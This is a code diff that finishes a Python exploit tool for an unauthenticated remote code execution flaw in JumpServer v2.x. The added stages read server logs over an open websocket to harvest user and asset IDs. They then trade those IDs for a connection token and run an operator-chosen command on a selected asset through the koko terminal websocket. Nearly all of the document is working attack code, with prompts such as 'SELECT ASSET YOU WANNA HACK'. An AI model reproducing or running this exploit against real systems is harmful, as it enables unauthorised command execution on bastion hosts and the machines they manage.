@@ -1,5 +1,23 @@
 #!/usr/bin/env python3
 # -*- encoding: utf-8 -*-
+#
+# jumpserver-v2.x-unauth-idl-rce
+# Copyright (C) 2020  kmahyyg @ PatMeow Ltd.
+#
+# This program is free software: you can redistribute it and/or modify
+# it under the terms of the GNU Affero General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU Affero General Public License for more details.
+#
+# You should have received a copy of the GNU Affero General Public License
+# along with this program.  If not, see <http://www.gnu.org/licenses/>.
+#
+
 
 import argparse
 
@@ -17,6 +35,8 @@ import re
 logging.basicConfig(level=logging.INFO,format="%(asctime)s | %(name)s | [%(levelname)s]: %(message)s")
 basicLogger = logging.getLogger('exploit')
 readLogLogger = logging.getLogger('remotelog')
+stage2Logger = logging.getLogger('stage2')
+stage3Logger = logging.getLogger('stage3')
 
 
 # ----- DO NOT CHANGE, POST ---[BLOCK START]---
@@ -24,11 +44,14 @@ PATH_PAYLOAD_1 = '/ws/ops/tasks/log/'
 PATH_PAYLOAD_2 = '/api/v1/users/connection-token/?user-only=1'
 PATH_PAYLOAD_2_ALT = '/api/v1/authentication/connection-token/?user-only=1'
 REFERER_PAYLOAD_2 = '/luna/?_={tms}'.format(tms=str(int(datetime.timestamp(datetime.now()))))
+COUNT_THRESHOLD = 10    # This is the number of assets id retrieve threshold AT LEAST, it seems that should not need to change
+# seems that the program either has bug or unknown reason, only tracked the 13?-latest log lines.
 
 GLOBAL_HEADERS = {
     'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36'
 }
 GLOBAL_TIMEOUT=5
+
 # Stage 3, HTTP, Switching to WS
 PATH_PAYLOAD_3 = '/koko/ws/token/?target_id={tid}'
 # ----- DO NOT CHANGE, POST ---[BLOCK END]---
@@ -37,6 +60,9 @@ PATH_PAYLOAD_3 = '/koko/ws/token/?target_id={tid}'
 # This should be changed according to current situation
 # Stage 1
 PAYLOAD_1 = '{"task":"/opt/jumpserver/logs/gunicorn"}'
+RETRYCOUNT_THRESHOLD = 500  # This is the max number of frames received from WS Logging stream
+# If after RETRYCOUNT_THRESHOLD frames, the related data still cannot be found, it will get stuck.
+# If it CANNOT find enough number of COUNT_THRESHOLD assets, it will get stuck.
 # Stage 2
 PATH_PAYLOAD_2_USE = PATH_PAYLOAD_2
 
@@ -76,18 +102,19 @@ class BasicInfo(object):
         elif step == 2:
             nheader = copy.deepcopy(GLOBAL_HEADERS)
             nheader['Referer'] = REFERER_PAYLOAD_2
-            readLogLogger.info("-------------------------------------------------------------------------")
+            stage2Logger.info("-------------------------------------------------------------------------")
             # Get Token Alternative Way
-            readLogLogger.info("If default request for token exchanging is failed, try again.")
-            readLogLogger.info(" You should see :  `!!!! FAILED !!!!` notification BEFORE you try again.")
-            readLogLogger.info("Possible Reason: Previous Token Expired, OR API Endpoint blocked.")
-            readLogLogger.info("Try: Re-run this program or change PATH_PAYLOAD_2_USE to PATH_PAYLOAD_2_ALT.")
-            readLogLogger.info("-------------------------------------------------------------------------")
+            stage2Logger.info("If default request for token exchanging is failed, try again.")
+            stage2Logger.info(" You should see :  `!!!! FAILED !!!!` notification BEFORE you try again.")
+            stage2Logger.info("Possible Reason: Previous Token Expired, OR API Endpoint blocked.")
+            stage2Logger.info("Try: Re-run this program or change PATH_PAYLOAD_2_USE to PATH_PAYLOAD_2_ALT.")
+            stage2Logger.info("-------------------------------------------------------------------------")
             # Get Token
             return [schema_h + self.host + PATH_PAYLOAD_2_USE, self.ssl, nheader, {}]
         elif step == 3:
             # Start RCE
-            return [schema_h + self.host + PATH_PAYLOAD_3, self.ssl, GLOBAL_HEADERS, {}]
+            # WARNING: NON-STANDARD OPERATION HERE, YOU SHOULD USE SCHEMA_H IF POSSIBLE AND ALSO IN BROWSER
+            return [schema_w + self.host + PATH_PAYLOAD_3, self.ssl, GLOBAL_HEADERS, {}]
         else:
             raise RuntimeError("Internal Function Error. Contact Author.")
 
@@ -95,23 +122,87 @@ class BasicInfo(object):
         self.__setattr__(name, value)
 
 
-async def runWS(url, ssl, payload):
+def utils_printlst(data: list):
+    # Note: Since the log is growing and rotating, you might want to select the latest asset,
+    # so everything can work fine.
+    stage2Logger.info("---------------------START SELECT ASSET YOU WANNA HACK ------------------------------")
+    stage2Logger.info("Use the number before the URL:")
+    for i in range(len(data)):
+        print("{asno}: {asdt}".format(asno=i, asdt=data[i]))
+    stage2Logger.info("----------------------DONE SELECT ASSET YOU WANNA HACK ------------------------------")
+
+
+async def runWS_stream(url, ssl, payload):
     async with websockets.connect(url, ssl=ssl) as wsapp:
-        buffer = ''
+        count = 0
+        finalurl = ''
+        retrycount = 0
         await wsapp.send(payload)
         while True:
             resp = await wsapp.recv()
             try:
                 msg = json.loads(resp)['message']
+                retrycount += 1
+                readLogLogger.debug("Current Retry Count: {}".format(retrycount))
                 if '/api/v1/perms/asset-permissions/user/validate/?action_name=connect&asset_id=' in msg:
-                    buffer += msg
+                    readLogLogger.info("Found 1 asset! Processing...")
+                    buffer = msg
+                    # Receive next frame to avoid truncated message
                     resp = await wsapp.recv()
                     buffer += json.loads(resp)['message']
-                    buffer += '\r\n'
+                    pattern = re.compile(r'\/api\/v1\/perms\/asset-permissions\/user\/validate\/(.*? )')
+                    m = pattern.search(buffer)
+                    finalurl += m.group()[:-1]
+                    finalurl += '\r\n'
+                    count += 1
+                    readLogLogger.info("Assets Processing Done. Wait for next assets or jump out...")
+                if count > COUNT_THRESHOLD-1 or retrycount > RETRYCOUNT_THRESHOLD:
                     break
             except:
                 pass
-        return buffer
+        return finalurl
+
+
+async def runWS_rce(url, ssl, payload):
+    stage3Logger.debug("INIT: START CONNECTION")
+    async with websockets.connect(url, ssl=ssl) as wsapp:
+        # start connection, get current ws session id
+        wsdt = await wsapp.recv()
+        wsid = json.loads(wsdt)["id"]
+        stage3Logger.debug("GET WS SESSION ID: {}".format(wsid))
+        # build command prototype
+        cmdtmpl = copy.deepcopy(json.loads(wsdt))
+        cmdtmpl["type"] = ""
+        cmdtmpl["data"] = ""
+        currcmd = copy.deepcopy(cmdtmpl)
+        # init terminal tty
+        stage3Logger.debug("INIT TERMINAL")
+        currcmd["type"] = "TERMINAL_INIT"
+        currcmd["data"] = json.dumps({"cols":125,"rows":35})
+        await wsapp.send(json.dumps(currcmd))
+        # recv 5 msg
+        pingmsg = ""
+        for i in range(5):
+            stage3Logger.warning("Please wait patiently, it might cost about 1min...")
+            initmsg = await wsapp.recv()
+            if json.loads(initmsg)["type"] == "PING":
+                pingmsg = initmsg
+                stage3Logger.info("Answering heartbeat, please wait...")
+                await wsapp.send(initmsg)
+            print(json.loads(initmsg)["data"])
+        # prevent further issue, send a ping before rce
+        await wsapp.send(pingmsg)
+        # execute cmd
+        currcmd["type"] = "TERMINAL_DATA"
+        currcmd["data"] = payload + "\r\n"
+        stage3Logger.info("Code Execution Done! Receiving reply...")
+        stage3Logger.warning("This program cannot recognize the end of reply, if you see the response you need, just ^C to kill it.")
+        await wsapp.send(json.dumps(currcmd))
+        # execute done
+        # recv 50 resp
+        for i in range(50):
+            initmsg = await wsapp.recv()
+            print(json.loads(initmsg)["data"])
 
 
 class STEP1(object):
@@ -121,14 +212,17 @@ class STEP1(object):
     def run(self):
         req = self.upper.getVulnURL(1)
         self.loop = asyncio.get_event_loop()
-        data = self.loop.run_until_complete(runWS(req[0], req[1], req[3]))
-        pattern = re.compile(r'\/api\/v1\/perms\/asset-permissions\/user\/validate\/(.*? )')
-        m = pattern.search(data)
-        finalurl = m.group()[:-1]
-        keyid = parse_qs(urlparse(finalurl, scheme='http').query)
+        data = self.loop.run_until_complete(runWS_stream(req[0], req[1], req[3]))
+        finalurl = data
+        dtlist = finalurl.split('\r\n')[:-1]
+        utils_printlst(dtlist)
+        print("\r\n")
+        selected_user = int(input("Choose one you want to hack? (int)"))
+        selectedurl = dtlist[selected_user]
+        keyid = parse_qs(urlparse(selectedurl, scheme='http').query)
         try:
             keydata = {"user": keyid['user_id'][0], "system_user": keyid['system_user_id'][0], "asset": keyid['asset_id'][0]}
-            self.upper.setattr('payload_post', keydata)
+            self.upper.setattr('payload2_post', keydata)
         except:
             raise ValueError("Token not found.")
 
@@ -138,8 +232,28 @@ class STEP2(object):
         self.upper = upper
 
     def run(self):
-        tmp1, tmp2, tmp3, tmp4 = self.upper.getVulnURL(2)
-        r = requests.post(verify=False, )
+        stage2Logger.info("Due to the time limitation and expiration of token:")
+        stage2Logger.info("Please input the command you wanna execute at the very beginning: ")
+        print("\r\n")
+        self.upper.setattr('s3cmd', input("Execute Command? "))
+        currurl, currssl, currheader, currpayl = self.upper.getVulnURL(2)
+        r = requests.post(verify=False, headers=currheader, url=currurl, json=self.upper.payload2_post)
+        try:
+            self.upper.setattr('s2token', r.json()['token'])
+        except:
+            print(r.json())
+            raise RuntimeError("Unknown internal Error.")
+
+
+class STEP3(object):
+    def __init__(self,upper):
+        self.upper = upper
+
+    def run(self):
+        currurl, currssl, currheader, currpayl = self.upper.getVulnURL(3)
+        currurl = currurl.format(tid=self.upper.s2token)
+        self.loop = asyncio.get_event_loop()
+        self.loop.run_until_complete(runWS_rce(currurl, currssl, self.upper.s3cmd))
 
 
 def __main__():
@@ -155,7 +269,8 @@ def __main__():
     action1.run()
     action2 = STEP2(binfo)
     action2.run()
-
+    action3 = STEP3(binfo)
+    action3.run()
 
 if __name__ == '__main__':
     __main__()
